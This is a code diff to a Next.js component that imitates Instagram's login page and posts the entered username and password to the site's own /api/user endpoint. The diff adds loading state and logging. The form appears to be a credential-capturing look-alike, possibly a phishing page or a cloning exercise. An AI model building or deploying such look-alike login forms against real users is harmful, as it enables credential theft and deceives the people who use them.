@@ -1,23 +1,48 @@
 'use client';
 import React, { useState } from 'react';
-
 import Link from 'next/link';
 
 const InstagramLogin = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState('');
+
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setLoading(true);
+    setMessage('');
 
-    const res = await fetch('/api/user', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ username, password })
-    });
-    const data = await res.json();
+    try {
+      console.log('Making request to /api/user');
+      
+      const res = await fetch('/api/user', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      });
+      
+      console.log('Response status:', res.status);
+      console.log('Response ok:', res.ok);
+      
+      if (!res.ok) {
+        throw new Error(`HTTP error! status: ${res.status}`);
+      }
+      
+      const data = await res.json();
+      console.log('Response data:', data);
+      setMessage(`Success: ${JSON.stringify(data)}`);
+      
+    } catch (error) {
+      console.error('Error:', error);
+      setMessage(`Error: ${error.message}`);
+    } finally {
+      setLoading(false);
+    }
   }
+
   return (
     <div className="h-screen flex items-center justify-center">
       <div className="mx-auto max-w-[935px] my-auto text-[#868585] pb-5 px-4">
@@ -39,6 +64,8 @@ const InstagramLogin = () => {
             </div>
 
             <form onSubmit={handleSubmit} className="flex flex-col items-center w-[355px] py-5 bg-white border border-[#dbdbdb] border-t-0">
+              
+              
               <input
                 type="text"
                 name="username"
@@ -47,6 +74,7 @@ const InstagramLogin = () => {
                 onChange={(e) => setUsername(e.target.value)}
                 placeholder="Phone, username or email"
                 className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
+                disabled={loading}
               />
               <input
                 type="password"
@@ -56,9 +84,14 @@ const InstagramLogin = () => {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
+                disabled={loading}
               />
-              <button type='submit'  className="w-[280px] mt-2 px-2.5 py-1.5 bg-[#8cd6ec] text-white font-medium rounded hover:bg-[#63c7e6] cursor-pointer">
-                Log In
+              <button 
+                type='submit'  
+                className="w-[280px] mt-2 px-2.5 py-1.5 bg-[#8cd6ec] text-white font-medium rounded hover:bg-[#63c7e6] cursor-pointer disabled:opacity-50"
+                disabled={loading}
+              >
+                {loading ? 'Logging in...' : 'Log In'}
               </button>
               <div className="flex items-center my-4 text-sm font-bold text-[#868585]">
                 <div className="w-[110px] h-px bg-[#dbdbdb] mx-4" />
